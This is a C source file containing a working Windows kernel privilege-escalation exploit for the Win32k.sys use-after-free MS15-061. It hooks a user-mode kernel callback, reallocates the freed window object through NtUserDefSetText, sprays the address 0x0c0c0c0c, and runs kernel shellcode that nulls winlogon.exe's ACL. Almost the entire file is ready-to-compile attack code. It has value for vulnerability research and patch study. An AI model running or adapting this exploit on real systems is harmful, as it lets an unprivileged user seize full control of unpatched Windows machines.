#include <windows.h>
#include<stdio.h>
/*

Exploiting MS15-061 with reverse engineering Win32k.sys by 

steps :

1: hook PEB callback Function 
2: trigger vulnerability ( make proper Window to lead vulnerable function)
3: replace  fake object with NtUserDefSetText in Desktop heap inside PEB callback 
4: fake object with save exit buffer(0x0c0c0c0c)  and pointer to tagWND 
5: do it until bServerSideWindowProc is set 

mail :   Firozimaysam@gmail.com 
twitter : https://twitter.com/R00tkitSMM 

*/
// TODO: check OS version , Code refactoring
/*

ref: 
 https://www.nccgroup.trust/globalassets/our-research/uk/whitepapers/2015/08/2015-08-27_-_ncc_group_-_exploiting_ms15_061_uaf_-_release.pdf
 http://www.mista.nu/research/mandt-win32k-slides.pdf
 https://labs.mwrinfosecurity.com/blog/2013/09/06/mwr-labs-pwn2own-2013-write-up---kernel-exploit/

*/
typedef struct _HANDLEENTRY{
    PVOID  phead;       
    ULONG  pOwner;      
    BYTE  bType;        
    BYTE  bFlags;       
    WORD  wUniq;       
}HANDLEENTRY,*PHANDLEENTRY;

typedef struct _SERVERINFO{   
    DWORD dwSRVIFlags;
	DWORD cHandleEntries;   
    WORD wSRVIFlags;      
    WORD wRIPPID;         
    WORD wRIPError;

    
}SERVERINFO,*PSERVERINFO;

typedef struct _SHAREDINFO{
    PSERVERINFO psi;      
    PHANDLEENTRY aheList;
	ULONG HeEntrySize; // Win7 - not present in WinXP?
    ULONG_PTR pDispInfo;      
    ULONG_PTR ulSharedDelta;
	ULONG_PTR awmControl; // Not in XP
    ULONG_PTR DefWindowMsgs; // Not in XP
    ULONG_PTR DefWindowSpecMsgs; // Not in XP
}SHAREDINFO,*PSHAREDINFO;


void* Get__Win32ClientInfo()
{
	/*
   +0x1d4 GdiTebBatch      : _GDI_TEB_BATCH
   +0x6b4 RealClientId     : _CLIENT_ID
   +0x6bc GdiCachedProcessHandle : Ptr32 Void
   +0x6c0 GdiClientPID     : Uint4B
   +0x6c4 GdiClientTID     : Uint4B
   +0x6c8 GdiThreadLocalInfo : Ptr32 Void
   +0x6cc Win32ClientInfo  : [62] Uint4B
   */
	void* address=NULL;
	__asm
	{
		  mov     eax,dword ptr fs:[00000018h] // eax=TEB
                  mov     eax,dword ptr [eax+0x6cc] // Win32ClientInfo
		  mov	  address,eax;
	}

	return address;
}


CHAR originalCLS[0x5c+2];

HWND GetKernelHandle(HWND hwnd)
{
	HWND kernelWindowHandle;
	ULONG i;
	HMODULE hUser32;
	PSHAREDINFO pSharedInfo;
	PSERVERINFO pServerInfo;
	HANDLEENTRY *UserHandleTable;

	pSharedInfo = (PSHAREDINFO)GetProcAddress(LoadLibraryA("user32.dll"), "gSharedInfo");
	if (pSharedInfo == NULL)
	{
		printf("[-] Unable to locate SharedInfo");
		return NULL;
	} else {
		printf("[*] SharedInfo @ %#p\r\n", pSharedInfo);
	}

	UserHandleTable = pSharedInfo->aheList;
	printf("[*] aheList @ %#p\r\n", UserHandleTable);

	pServerInfo = pSharedInfo->psi;
	printf("[*] pServerInfo @ %#p\r\n", pServerInfo);
	printf("[*] Handle Count: %d\r\n", pServerInfo->cHandleEntries);
	// printf("User Delta 0x%p\r\n", pSharedInfo->ulSharedDelta); Not used

	for(i = 0; i < pServerInfo->cHandleEntries; i++ ) 
	{
		__try
		{
			//
			kernelWindowHandle = (HWND)(i | (UserHandleTable[i].wUniq << 0x10));
			if( kernelWindowHandle == hwnd )
			{
				kernelWindowHandle = (HWND)UserHandleTable[i].phead;
				printf("[+] Kernel Window Handle found @ %#p\r\n", kernelWindowHandle);
				return kernelWindowHandle;
			}
		}
		__except(EXCEPTION_EXECUTE_HANDLER) {}
    }

	return NULL;
}

VOID ArbDecByOne(DWORD addr){

*(DWORD *)(originalCLS + 0x58) = addr - 0x4;

}

typedef struct _LARGE_UNICODE_STRING {
    ULONG Length;
    ULONG MaximumLength : 31;
    ULONG bAnsi : 1;
    PWSTR Buffer;
} LARGE_UNICODE_STRING, *PLARGE_UNICODE_STRING;

VOID RtlInitLargeUnicodeString(
    PLARGE_UNICODE_STRING plstr,
    LPCWSTR psz,
    UINT cchLimit)
{
    ULONG Length;

    plstr->Buffer = (PWSTR)psz;
    plstr->bAnsi = FALSE;
    if ( psz!=NULL) {
        Length = wcslen( psz ) * sizeof( WCHAR );
        plstr->Length = min(Length, cchLimit);
        plstr->MaximumLength = min((Length + sizeof(UNICODE_NULL)), cchLimit);
    } else {
        plstr->MaximumLength = 0;
        plstr->Length = 0;
    }
}


__declspec(naked) BOOL NTAPI NtUserDefSetText(
	IN HWND hwnd,
    IN PLARGE_UNICODE_STRING pstrText OPTIONAL
	)
{
    __asm
    {
                        mov     eax, 116Dh
			mov     edx, 7FFE0300h	
			call    dword ptr [edx]
			retn    8
    }
}


//the Window Procedure
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{

   return DefWindowProc(hwnd, msg, wParam, lParam);
}

void* kernelHandle;
__declspec(noinline) int Shellcode()
{
	//return MessageBoxA(NULL,"Boom","boom",0);
	__asm {
		mov eax, kernelHandle // WND - Which window? Check this
		mov eax, [eax+8] // THREADINFO
		mov eax, [eax] // ETHREAD
		mov eax, [eax+0x150] // KPROCESS
		mov eax, [eax+0xb8] // flink
		procloop:
		lea edx, [eax-0xb8] // KPROCESS
		mov eax, [eax]
		add edx, 0x16c // module name
		cmp dword ptr [edx], 0x6c6e6977 // “winl” for winlogon.exe
		jne procloop
		sub edx, 0x170
		mov dword ptr [edx], 0x0 // NULL ACL
	}
}

BOOL success = FALSE;
LRESULT CALLBACK WndProc2(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{

	WORD um=0;
	__asm
	{
		mov ax, cs
		mov um, ax
	}
	if(um == 0x1b)
	{
		// USER MODE
	} else
	{
		success=TRUE;
		DebugBreak();

		Shellcode();
	}

   return DefWindowProc(hwnd, msg, wParam, lParam);
}

HWND Secondhwnd[50];
int SecondWindowIndex=1;
void CreateSecondWindow()
{
	WNDCLASSEX wc;
	const WCHAR g_szClassName[] = L"SecondClass";

    //Step 1: Registering the Window Class
    wc.cbSize        = sizeof(WNDCLASSEX);
    wc.style         = 0;
    wc.lpfnWndProc   = WndProc2;
    wc.cbClsExtra    = 0;
    wc.cbWndExtra    = 0;
    wc.hInstance     = NULL;
    wc.hIcon         = LoadIcon(NULL,IDI_QUESTION);
    wc.hCursor       = LoadCursor(NULL, IDI_QUESTION);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    wc.lpszMenuName  = NULL;
    wc.lpszClassName = g_szClassName;
    wc.hIconSm       = LoadIcon(NULL,IDI_QUESTION);  
	
	if(!RegisterClassExW(&wc))
    {
        return ;
    }

	for ( int i=0;i<50;i++)
	{
		Secondhwnd[i] = CreateWindowEx(
			WS_EX_CLIENTEDGE,
			g_szClassName,
			L"The title of my window",
			WS_OVERLAPPEDWINDOW,
			CW_USEDEFAULT, CW_USEDEFAULT, 240, 120,
			NULL, NULL, NULL, NULL);

		if(Secondhwnd[i] == NULL)
		{

			return ;
		}
	}
}

const WCHAR g_szClassName[] = L"MS15-061";
 HWND hwnd;
 HINSTANCE hInstance2;
typedef NTSTATUS (NTAPI *pUser32_ClientCopyImage)(PVOID p);
pUser32_ClientCopyImage g_originalCCI;
void*  __ClientCopyImageAddress;



NTSTATUS NTAPI hookCCI(PVOID p)
{

	LARGE_UNICODE_STRING plstr;
	// free  WND object  
	DestroyWindow(hwnd);
	UnregisterClassW(g_szClassName,NULL);
	
	

	/*
	.text:BF89EA6D                 push    edx
	.text:BF89EA6E                 call    _xxxClientCopyImage@20 ; xxxClientCopyImage(x,x,x,x,x)
	.text:BF89EA73                 lea     esi, [edi+58h]  ------->>>> replace edi memeory with NtUserDefSetText
	.text:BF89EA76                 mov     edx, eax
	.text:BF89EA78                 mov     ecx, esi
	.text:BF89EA7A                 call    @HMAssignmentLock@8 ; HMAssignmentLock(x,x)

	*/

	

	DebugBreak();
	RtlInitLargeUnicodeString(&plstr,(WCHAR*)originalCLS, (UINT)-1);
	NtUserDefSetText(Secondhwnd[SecondWindowIndex],&plstr);
	SecondWindowIndex+=1;
	return g_originalCCI(p);
}


void* Get__ClientCopyImageAddressInPEB()
{
	void* address=NULL;
	__asm
	{
		  mov edx , 0xD8; // 0x36 *4 ->  API index *4  number  for  __ClientCopyImage
		  mov     eax,dword ptr fs:[00000018h] // eax=TEB
         	  mov     eax,dword ptr [eax+30h] // EAX=PEB
                  mov     eax,dword ptr [eax+2Ch] // EAX=KernelCallbackTable
		  add	  eax,edx
		  mov	  address,eax;
		  int 3
		
	}

	return address;
}



void init()
{
	DWORD prot;

	LoadLibraryA("user32.dll");
	CreateSecondWindow();

	void* lpvBase = VirtualAlloc(
                     (void*)0x0c0c0c0c,                 // System selects address
                    2048, // Size of allocation
                     MEM_RESERVE|MEM_COMMIT,          // Allocate reserved pages
                     PAGE_READWRITE);       // Protection = no access


	/*
	for save exit  : i used trick like  Browser Fake vTable : 
	allocate 0x0c0c0c0c address and  fill tagWND with 0x0c0c0c0c 
	so every dereference  will loop in 0x0c0c0c0c

	*/
	memset(lpvBase,'\x0c',2048);

	memset(originalCLS,0,0x5c+2);
	memset(originalCLS,'\x0c',0x5c);


	/*
   +0x014 bForceMenuDraw   : Pos 15, 1 Bit
   +0x014 bDialogWindow    : Pos 16, 1 Bit
   +0x014 bHasCreatestructName : Pos 17, 1 Bit
   +0x014 bServerSideWindowProc : Pos 18, 1 Bit
   +0x014 bAnsiWindowProc  : Pos 19, 1 Bit
   */

	kernelHandle=GetKernelHandle(Secondhwnd[0]);
	ArbDecByOne((DWORD)kernelHandle+0x14);  // 

	__ClientCopyImageAddress=Get__ClientCopyImageAddressInPEB();
	printf("address of __ClientCopyImage is %x \r\n",__ClientCopyImageAddress);
	
	if (!VirtualProtect(__ClientCopyImageAddress, sizeof(PVOID), PAGE_EXECUTE_READWRITE, &prot))
	{
		return ;
	}
	g_originalCCI =(pUser32_ClientCopyImage) InterlockedExchangePointer(__ClientCopyImageAddress, &hookCCI);


}
int  main()
{
    WNDCLASSEX wc;
    int x;
    MSG Msg;

    //Step 1: Registering the Window Class
    wc.cbSize        = sizeof(WNDCLASSEX);
    wc.style         = 0;
    wc.lpfnWndProc   = WndProc;
    wc.cbClsExtra    = 0;
    wc.cbWndExtra    = 0;
    wc.hInstance     = NULL;
    wc.hIcon         = NULL; // bypass  check  inside xxxSetClassIcon to lead  execution path to callback  
    wc.hCursor       = NULL; // bypass  check  inside xxxSetClassIcon to lead  execution path to callback  
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
    wc.lpszMenuName  = NULL;
    wc.lpszClassName = g_szClassName;
    wc.hIconSm       = NULL; // bypass  "if" inside xxxSetClassIcon to lead  execution  path to callback  

    init();

/*


	.text:BF91B33C                 mov     edi, [ebp+pclsBase]
	..............
	..............
	.text:BF91B346                 mov     eax, [edi+58h]
	.text:BF91B349                 cmp     eax, [ebp+arg_8] ; new and  old  icon must be  diffrent  
	.text:BF91B34C                 jz      loc_BF91B42C     ----------->>> we  need bypass this  
	..............
	..............
	.text:BF91B396 loc_BF91B396:                           ; CODE XREF: xxxSetClassIcon(x,x,x,x)+68j
	.text:BF91B396                 lea     esi, [edi+58h]  ;  EDI
	.text:BF91B399                 mov     ecx, esi
	.text:BF91B39B                 mov     edx, [ebp+arg_8]
	.text:BF91B39E                 call    @HMAssignmentLock@8 ; HMAssignmentLock(x,x)
	.text:BF91B3A3                 cmp     dword ptr [edi+44h], 0
	.text:BF91B3A7                 jz      short loc_BF91B3B4  ---------->>> we  need  bypass this
	.text:BF91B3A9                 cmp     dword ptr [esi], 0
	.text:BF91B3AC                 jnz     short loc_BF91B3B4  ---------->>> we  need  bypass this  
	.text:BF91B3AE                 push    edi
	.text:BF91B3AF                 call    _xxxCreateClassSmIcon@4 ; xxxCreateClassSmIcon(x)  

*/

	do
	{
		if(!RegisterClassExW(&wc))
		{
			return 0;
		}

		// Step 2: Creating the Window
		hwnd = CreateWindowEx(
			WS_EX_CLIENTEDGE,
			g_szClassName,
			L"The title of my window",
			WS_OVERLAPPEDWINDOW,
			CW_USEDEFAULT, CW_USEDEFAULT, 240, 120,
			NULL, NULL, NULL, NULL);

		if(hwnd == NULL)
		{
			return 0;
		}

		ShowWindow(hwnd, NULL);
		UpdateWindow(hwnd);
		//Triger UserMode CallBack 
		SetClassLongPtr(hwnd, GCLP_HICON, (LONG_PTR)LoadIcon(NULL, IDI_QUESTION));

		SendMessageW(Secondhwnd[0], WM_NULL, NULL, NULL);
	}while(!success);

}
